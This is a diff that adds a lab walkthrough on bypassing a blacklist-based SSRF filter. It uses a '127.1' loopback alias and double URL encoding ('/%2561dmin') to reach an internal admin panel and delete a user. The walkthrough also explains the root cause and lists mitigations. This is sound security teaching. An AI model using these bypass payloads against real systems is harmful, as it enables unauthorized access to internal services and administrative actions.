@@ -1,0 +1,277 @@
+# SSRF with Blacklist-Based Input Filter
+
+## Objective
+
+The objective of this lab is to exploit a **Server-Side Request Forgery (SSRF)** vulnerability protected by a **blacklist-based input filter**.
+
+The application attempts to prevent access to internal resources by blocking specific hostnames and URL paths. The goal is to bypass these restrictions, access the internal administrative interface, and delete the user **carlos**.
+
+---
+
+# Vulnerability Overview
+
+The application allows users to specify a URL through the `stockApi` parameter, which the server requests on behalf of the client.
+
+To mitigate SSRF attacks, the application implements a blacklist that blocks requests containing:
+
+* The localhost IP address (`127.0.0.1`)
+* The administrative endpoint (`/admin`)
+
+However, blacklist-based filtering is insufficient because multiple equivalent representations of the same resource exist, allowing attackers to bypass the implemented restrictions.
+
+---
+
+# Step 1 – Intercept the Stock Check Request
+
+Browse to any product and click **Check stock**.
+
+Intercept the request using **Burp Suite Proxy**.
+
+The intercepted request is similar to:
+
+```http
+POST /product/stock HTTP/2
+
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
+```
+
+Send the request to **Burp Repeater**.
+
+---
+
+# Step 2 – Verify the Blacklist
+
+Replace the value of the `stockApi` parameter with:
+
+```text
+http://127.0.0.1/
+```
+
+The application rejects the request, confirming that direct access to localhost is blocked.
+
+---
+
+# Step 3 – Bypass the Localhost Filter
+
+Replace the URL with:
+
+```text
+http://127.1/
+```
+
+Although written differently, `127.1` is interpreted as `127.0.0.1` by the operating system and networking libraries.
+
+Since the blacklist only blocks the literal string `127.0.0.1`, the request bypasses the filter successfully.
+
+---
+
+# Step 4 – Attempt to Access the Admin Interface
+
+Modify the URL to:
+
+```text
+http://127.1/admin
+```
+
+The request is blocked once again.
+
+This indicates that the application performs an additional blacklist check against the `/admin` path.
+
+---
+
+# Step 5 – Bypass the Path Filter
+
+The application validates the URL before it is fully decoded.
+
+To evade the blacklist, double URL encode the character **a**.
+
+Original path:
+
+```text
+/admin
+```
+
+Single URL encoding:
+
+```text
+/%61dmin
+```
+
+Double URL encoding:
+
+```text
+/%2561dmin
+```
+
+The resulting URL becomes:
+
+```text
+http://127.1/%2561dmin
+```
+
+After the application decodes the URL, the request is interpreted as:
+
+```text
+http://127.0.0.1/admin
+```
+
+allowing access to the administrative interface.
+
+---
+
+# Step 6 – Delete the Target User
+
+Inspect the HTML returned by the administrative interface and identify the endpoint responsible for deleting the target user.
+
+Modify the URL to:
+
+```text
+http://127.1/%2561dmin/delete?username=carlos
+```
+
+Send the request.
+
+The application performs the request internally and deletes the user **carlos**, completing the lab.
+
+---
+
+# Technical Explanation
+
+The blacklist attempts to identify dangerous requests by searching for specific strings within the supplied URL.
+
+This approach fails because multiple equivalent representations of the same destination exist.
+
+For example:
+
+```text
+127.1
+```
+
+is resolved internally as:
+
+```text
+127.0.0.1
+```
+
+Similarly, the application validates the URL before the decoding process is complete.
+
+The sequence is effectively:
+
+```text
+User Input
+      │
+      ▼
+Blacklist Validation
+      │
+      ▼
+URL Decoding
+      │
+      ▼
+HTTP Request
+```
+
+Since the blacklist evaluates:
+
+```text
+/%2561dmin
+```
+
+instead of:
+
+```text
+/admin
+```
+
+the request is accepted.
+
+During URL decoding:
+
+```text
+%2561
+      │
+      ▼
+%61
+      │
+      ▼
+a
+```
+
+The final request sent by the server targets the administrative endpoint successfully.
+
+---
+
+# Proof of Concept
+
+Blocked request:
+
+```text
+http://127.0.0.1/admin
+```
+
+Bypassed request:
+
+```text
+http://127.1/%2561dmin
+```
+
+Administrative action:
+
+```text
+http://127.1/%2561dmin/delete?username=carlos
+```
+
+---
+
+# Root Cause
+
+The application relies on blacklist-based validation to prevent SSRF attacks.
+
+Instead of validating the resolved destination, it compares the raw user input against a list of forbidden strings.
+
+Additionally, validation occurs before complete URL normalization and decoding, allowing encoded payloads to bypass the implemented restrictions.
+
+---
+
+# Impact
+
+Successful exploitation enables an attacker to:
+
+* Access internal-only resources.
+* Bypass blacklist-based protections.
+* Reach administrative interfaces.
+* Perform unauthorized administrative actions.
+* Expand the attack surface by accessing additional internal services.
+
+In real-world environments, similar vulnerabilities may expose cloud metadata services, internal APIs, monitoring systems, and management interfaces.
+
+---
+
+# Mitigation
+
+To prevent this vulnerability:
+
+* Avoid blacklist-based filtering.
+* Normalize and fully decode URLs before validation.
+* Validate the resolved destination rather than the raw input.
+* Implement strict allowlists for permitted hosts.
+* Block requests to loopback and private IP ranges after DNS resolution.
+* Restrict outbound network connections using firewall rules.
+* Monitor outbound HTTP requests for suspicious activity.
+
+---
+
+# Key Takeaways
+
+This lab demonstrates why blacklist-based defenses are ineffective against SSRF vulnerabilities.
+
+Attackers can leverage alternative IP representations and encoded payloads to bypass simplistic filters that rely on string matching.
+
+The exploitation process consisted of:
+
+1. Confirming that localhost access was blocked.
+2. Bypassing the IP blacklist using an alternative loopback representation (`127.1`).
+3. Bypassing the path blacklist through double URL encoding (`%2561`).
+4. Accessing the internal administrative interface.
+5. Performing a privileged administrative action via SSRF.
+
+This technique is frequently encountered during real-world penetration tests, where improperly implemented blacklist filters provide only superficial protection against SSRF attacks.
